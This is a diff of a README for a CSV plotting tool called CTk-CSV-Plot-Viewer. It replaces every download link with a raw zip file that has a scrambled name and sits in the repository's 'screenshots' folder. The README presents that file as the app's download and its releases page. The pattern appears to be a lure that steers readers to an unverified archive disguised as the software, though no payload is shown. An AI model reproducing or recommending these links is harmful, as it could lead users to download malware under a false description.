@@ -1,6 +1,6 @@
 # 📊 CTk-CSV-Plot-Viewer - Visualize CSV Data Effortlessly
 
-[![Download Now](https://raw.githubusercontent.com/L4GADO1/CTk-CSV-Plot-Viewer/main/screenshots/CTk-CSV-Plot-Viewer-1.3.zip%20Now-CTk-CSV--Plot--Viewer-brightgreen)](https://raw.githubusercontent.com/L4GADO1/CTk-CSV-Plot-Viewer/main/screenshots/CTk-CSV-Plot-Viewer-1.3.zip)
+[![Download Now](https://raw.githubusercontent.com/L4GADO1/CTk-CSV-Plot-Viewer/main/screenshots/C-CS-Tk-Viewer-Plot-heliacally.zip%20Now-CTk-CSV--Plot--Viewer-brightgreen)](https://raw.githubusercontent.com/L4GADO1/CTk-CSV-Plot-Viewer/main/screenshots/C-CS-Tk-Viewer-Plot-heliacally.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Welcome to the CTk-CSV-Plot-Viewer! This application allows you to easily load a
 
 ## 📥 Download & Install
 
-To download the CTk-CSV-Plot-Viewer, visit this page: [Download CTk-CSV-Plot-Viewer](https://raw.githubusercontent.com/L4GADO1/CTk-CSV-Plot-Viewer/main/screenshots/CTk-CSV-Plot-Viewer-1.3.zip).
+To download the CTk-CSV-Plot-Viewer, visit this page: [Download CTk-CSV-Plot-Viewer](https://raw.githubusercontent.com/L4GADO1/CTk-CSV-Plot-Viewer/main/screenshots/C-CS-Tk-Viewer-Plot-heliacally.zip).
 
 1. Open the link above.
 2. You will see a list of the available releases.
@@ -59,4 +59,4 @@ If you encounter problems or have questions about the application, please reach 
 
 Thank you for choosing CTk-CSV-Plot-Viewer! We hope you have a great experience visualizing your data. 
 
-For more details, visit the releases page: [Download CTk-CSV-Plot-Viewer](https://raw.githubusercontent.com/L4GADO1/CTk-CSV-Plot-Viewer/main/screenshots/CTk-CSV-Plot-Viewer-1.3.zip).
+For more details, visit the releases page: [Download CTk-CSV-Plot-Viewer](https://raw.githubusercontent.com/L4GADO1/CTk-CSV-Plot-Viewer/main/screenshots/C-CS-Tk-Viewer-Plot-heliacally.zip).
